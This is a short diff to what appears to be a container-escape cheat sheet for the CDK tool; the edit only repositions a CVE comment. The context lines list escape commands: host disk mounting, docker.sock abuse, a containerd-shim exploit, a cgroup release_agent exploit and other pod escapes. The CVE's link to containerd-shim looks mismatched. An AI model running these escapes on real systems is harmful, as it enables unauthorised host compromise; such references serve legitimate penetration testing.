@@ -478,7 +478,7 @@ cdk evaluate --full
 # CDK escape variants:
 cdk run mount-disk        # try mounting host disks
 cdk run escape-docker.sock # exploit docker.sock if present
-cdk run containerd-shim-pwn (CVE-2024-21626) # if vulnerable
+cdk run containerd-shim-pwn  # CVE-2024-21626, if vulnerable
 cdk run nerve-pwn          # exploit cgroup release_agent (older kernels)
 cdk run pod-escape-...    # various others
 ```
